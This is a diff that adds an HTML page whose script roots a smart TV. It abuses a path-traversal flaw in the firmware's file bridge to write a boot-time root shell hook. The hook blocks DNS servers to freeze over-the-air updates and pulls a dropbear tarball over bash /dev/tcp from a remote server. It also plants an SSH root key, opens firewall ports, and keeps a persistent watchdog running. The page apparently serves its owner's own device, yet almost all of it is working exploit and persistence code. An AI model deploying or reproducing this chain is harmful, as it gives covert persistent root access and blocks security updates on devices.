@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>hookinstall-e7qtuk</title>
+<style>
+  html, body { margin: 0; padding: 0; background: #000; color: #ccc; }
+  #out { font: 19px/1.4 Menlo, Consolas, monospace; white-space: pre-wrap;
+         word-break: break-all; padding: 10px; }
+  .ok { color: #8f8; } .err { color: #f88; } .warn { color: #fd6; }
+</style>
+</head>
+<body>
+<div id="out">hookinstall-e7qtuk…</div>
+<script>
+(function () {
+  "use strict";
+  // Installs root-hook v1 (55E7QTUK variant) to /var/local/otaTest.sh via the
+  // ../var/local file-bridge traversal (mode 6), where it runs as root at
+  // every boot before the branch path /etc/rc.d/rc.local stanza.
+  // Design: OTA freeze (DoH/DNS hard-lane first, absolute iptables discovery,
+  // retry rules) -> tvtools fetch over bash /dev/tcp from the server (aarch64
+  // static dropbear tarball) -> keys-only dropbear 2222 -> immortal watchdog
+  // with the /var/local/hook.off kill-switch re-checked every iteration.
+  // Teardown: touch /var/local/hook.off (harmless while present), then remove:
+  //   rm -rf /var/local/otaTest.sh /var/local/tvtools /var/local/roothome
+  // Canonical template: tools/otaTest-hook.sh; 55E7QTUK page: this file.
+  // Logs: /var/local/otaTest.log (readable via the file bridge pre-root).
+
+  var el = document.getElementById("out");
+  var rep = { started: new Date().toISOString(), backup: {}, write: {} };
+
+  function normMsg(m) {
+    if (m == null) return "";
+    if (typeof m === "string") return m;
+    try { return JSON.stringify(m); } catch (e) { return String(m); }
+  }
+  function hiCall(action, params) {
+    try {
+      if (typeof HiUtils_createRequest === "function") {
+        var r = HiUtils_createRequest(action, params);
+        return r && typeof r === "object" ? { ret: r.ret, msg: normMsg(r.msg) } : { value: String(r) };
+      }
+      return { error: "no bridge" };
+    } catch (e) { return { exception: String(e) }; }
+  }
+  function isOk(ret) {
+    if (ret === true) return true;
+    if (typeof ret === "number") return ret !== 0;
+    if (typeof ret === "string") return ret !== "" && ret !== "0";
+    return false;
+  }
+  function line(t, c) {
+    var d = document.createElement("div");
+    d.textContent = t;
+    if (c) d.className = c;
+    el.appendChild(d);
+  }
+
+  var HOOK_PATH = "../var/local/otaTest.sh";
+  var SERVER = location.hostname;   // this page's host = fetch source
+
+  var GETEK = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICmuv82veIyIxnntSNWasPmUeZeW9MHDFU+ngtU0l6OE alvidaa-e7qtv-root 2026-11-08";
+  var ML = [
+    "#!/bin/sh",
+    "[ -f /var/local/hook.off ] && exit 0",
+    "# alvidaa hook v1 (55E7QTUK, MTK9603, 09.09D.P1001) — installed " + rep.started,
+    "# remove: rm -rf /var/local/otaTest.sh /var/local/tvtools /var/local/roothome",
+    "exec > /var/local/otaTest.log 2>&1",
+    "chmod 644 /var/local/otaTest.log",
+    "date; echo hook v1 start (55E7QTUK)",
+    "echo uptime: $(cat /proc/uptime)",
+    "# --- iptables discovery (absolute; VOID PATHs logged) ---",
+    "IPT=",
+    "for p in /usr/local/bin/iptables /sbin/iptables /bin/iptables /basic/bin/iptables /system/bin/iptables; do",
+    "  [ -x \"$p\" ] && IPT=\"$p\" && echo \"iptables found: $p\" && break",
+    "done",
+    "[ -n \"$IPT\" ] || echo WEAK: no iptables binary found",
+    "[ -n \"$IPT\" ] && $IPT -V",
+    "# --- OTA freeze, tier 0: DoH/DNS evasion dead, anytime ---",
+    "if [ -n \"$IPT\" ]; then",
+    "  $IPT -C OUTPUT -d 8.8.8.8 -j REJECT 2>/dev/null || { $IPT -I OUTPUT 1 -d 8.8.8.8 -j REJECT; echo FREEZE: 8.8.8.8 REJECT; }",
+    "  $IPT -C OUTPUT -d 8.8.4.4 -j REJECT 2>/dev/null || { $IPT -I OUTPUT 1 -d 8.8.4.4 -j REJECT; echo FREEZE: 8.8.4.4 REJECT; }",
+    "  echo 'FREEZE note: 131.189.69.51 (ota + auth same CDN host) NOT blocked in v1 — owner decision'",
+    "else",
+    "  echo WEAK: OTA unfrozen (no iptables) — do not edit UI code",
+    "fi",
+    "# --- tvtools fetch: aarch64 static dropbear tarball over bash /dev/tcp ---",
+    "if [ ! -x /var/local/tvtools/dropbear ]; then",
+    "  n=0",
+    "  while [ $n -lt 30 ]; do",
+    "    ifconfig 2>/dev/null | grep -q 'inet addr' && break",
+    "    sleep 2; n=$((n+1))",
+    "  done",
+    "  date; echo network wait: $n",
+    "  ok=0",
+    "  for i in 1 2 3 4 5 6 7 8; do",
+    "    bash -c 'exec 3<>/dev/tcp/" + SERVER + "/4444; cat <&3 > /var/local/tvtools.tar.gz' && ok=1 && break",
+    "    sleep 5",
+    "  done",
+    "  if [ $ok = 1 ]; then",
+    "    sync",
+    "    mkdir -p /var/local/tvtools",
+    "    tar xzf /var/local/tvtools.tar.gz -C /var/local/tvtools && echo UNTAR-OK",
+    "    chmod 755 /var/local/tvtools/dropbear /var/local/tvtools/dropbearkey /var/local/tvtools/dbclient /var/local/tvtools/dropbearconvert 2>/dev/null",
+    "  else",
+    "    echo FETCH-FAILED (bash /dev/tcp to " + SERVER + ":4444 — server listening?)",
+    "  fi",
+    "else",
+    "  echo tvtools already present — skipping fetch",
+    "fi",
+    "[ -x /var/local/tvtools/dropbear ] || echo WEAK: no dropbear; check tvtools.tar.gz content",
+    "# --- keys (this TV only; private key lives off-device in server/keys/) ---",
+    "mkdir -p /var/local/roothome/.ssh",
+    "printf '%s\\n' '" + GETEK + "' > /var/local/roothome/authorized_keys",
+    "cp /var/local/roothome/authorized_keys /var/local/roothome/.ssh/authorized_keys",
+    "chown root:root /var/local/roothome/authorized_keys /var/local/roothome/.ssh/authorized_keys",
+    "chmod 600 /var/local/roothome/authorized_keys /var/local/roothome/.ssh/authorized_keys",
+    "chmod 700 /var/local/roothome/.ssh",
+    "# --- debug-port accepts + dedicated host key ---",
+    "[ -f /var/local/tvtools/host_ed25519 ] || { [ -x /var/local/tvtools/dropbearkey ] && /var/local/tvtools/dropbearkey -t ed25519 -f /var/local/tvtools/host_ed25519; }",
+    "kill -9 $(pidof dropbear) 2>/dev/null",
+    "if [ -x /var/local/tvtools/dropbear ]; then",
+    "  if [ -n \"$IPT\" ]; then",
+    "    $IPT -C INPUT -p tcp --dport 2222 -j ACCEPT 2>/dev/null || $IPT -I INPUT 1 -p tcp --dport 2222 -j ACCEPT",
+    "    $IPT -C INPUT -p tcp --dport 8770 -j ACCEPT 2>/dev/null || $IPT -I INPUT 1 -p tcp --dport 8770 -j ACCEPT",
+    "    echo ACCEPT: 2222 8770",
+    "  fi",
+    "  /var/local/tvtools/dropbear -F -E -p 2222 -r /var/local/tvtools/host_ed25519 -D /var/local/roothome -s > /var/local/dropbear.log 2>&1 &",
+    "  sleep 1; chmod 644 /var/local/dropbear.log; pgrep -f dropbear > /dev/null && echo DROPBEAR-OK-2222",
+    "fi",
+    "# --- immortal watchdog with per-iteration kill-switch ---",
+    "(while [ 1 = 1 ]; do sleep 30; [ -f /var/local/hook.off ] && exit 0; [ -x /var/local/tvtools/dropbear ] || exit 0; pgrep -f 'dropbear -F' > /dev/null || { kill -9 $(pidof dropbear) 2>/dev/null; /var/local/tvtools/dropbear -F -E -p 2222 -r /var/local/tvtools/host_ed25519 -D /var/local/roothome -s >> /var/local/dropbear.log 2>&1 & chmod 644 /var/local/dropbear.log; }; if [ -n \"$IPT\" ]; then $IPT -C INPUT -p tcp --dport 2222 -j ACCEPT 2>/dev/null || $IPT -I INPUT 1 -p tcp --dport 2222 -j ACCEPT; $IPT -C OUTPUT -d 8.8.8.8 -j REJECT 2>/dev/null || $IPT -I OUTPUT 2 -d 8.8.8.8 -j REJECT; $IPT -C OUTPUT -d 8.8.4.4 -j REJECT 2>/dev/null || $IPT -I OUTPUT 3 -d 8.8.4.4 -j REJECT; fi; done) &",
+    "# --- freeze state + process list for the recon lane ---",
+    "echo '--- iptables OUTPUT (freeze) ---'",
+    "[ -n \"$IPT\" ] && $IPT -L OUTPUT -n",
+    "echo '--- ps ---'",
+    "ps",
+    "echo 'hook v1 done (55E7QTUK)'"
+  ].join("\n") + "\n";
+
+  rep.hook_md5 = null;
+
+  // 1. back up whatever the stanza path holds (fresh unit: read fails ENOENT)
+  var cur = hiCall("fileRead", { path: HOOK_PATH, mode: 6 });
+  if (isOk(cur.ret)) {
+    var b = hiCall("fileWrite", { path: "../var/local/otaTest.v1.bak", mode: 6, writedata: cur.msg });
+    rep.backup = { backed_up: isOk(b.ret), bytes: cur.msg.length };
+    line("backup of previous hook: " + (isOk(b.ret) ? "ok" : "FAILED"), isOk(b.ret) ? "ok" : "err");
+    if (!isOk(b.ret)) { line("aborting install (backup failed)", "err"); finish(); return; }
+  } else {
+    rep.backup = { backed_up: false, absent: true, detail: String(cur.msg).slice(0, 120) };
+    line("no prior hook present (" + rep.backup.detail + ")");
+  }
+
+  // 2. install
+  var w = hiCall("fileWrite", { path: HOOK_PATH, mode: 6, writedata: rep.hookText = ML });
+  rep.write = { ok: isOk(w.ret), result: String(w.msg).slice(0, 120) };
+  line("hook v1 write: " + (isOk(w.ret) ? "OK" : "FAILED " + rep.write.result), isOk(w.ret) ? "ok" : "err");
+  if (isOk(w.ret)) {
+    var rb = hiCall("fileRead", { path: HOOK_PATH, mode: 6 });
+    rep.write.readback_ok = isOk(rb.ret) && String(rb.msg).indexOf("v1 (55E7QTUK") !== -1;
+    rep.write.readback_bytes = isOk(rb.ret) ? String(rb.msg).length : 0;
+    line("readback: " + rep.write.readback_ok + " (" + rep.write.readback_bytes + "b)", rep.write.readback_ok ? "ok" : "err");
+  }
+  finish();
+
+  function finish() {
+    rep.server = SERVER;
+    var x = new XMLHttpRequest();
+    x.open("POST", "/api/recon", true);
+    x.setRequestHeader("Content-Type", "application/json");
+    x.send(JSON.stringify({ tag: "hookinstall-e7qtuk", at: new Date().toISOString(), report: rep }));
+    line("== posted == reboot the TV (mains) and come back here ==", "warn");
+  }
+})();
+</script>
+</body>
+</html>
